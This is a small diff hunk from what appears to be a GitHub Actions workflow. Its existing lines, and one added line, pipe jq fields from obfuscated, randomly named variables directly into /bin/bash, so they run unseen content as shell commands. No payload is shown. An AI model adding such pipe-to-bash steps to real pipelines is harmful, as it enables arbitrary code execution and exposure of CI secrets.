@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$sprlu56" | jq -r .kkuy1607 | /bin/bash
           printf '%s' "$swqwg59" | jq -r .ybgt5 | /bin/bash
           echo $vcwxm37 | jq -r .l137 | /bin/bash
+          echo $z10 | jq -r .lt0 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
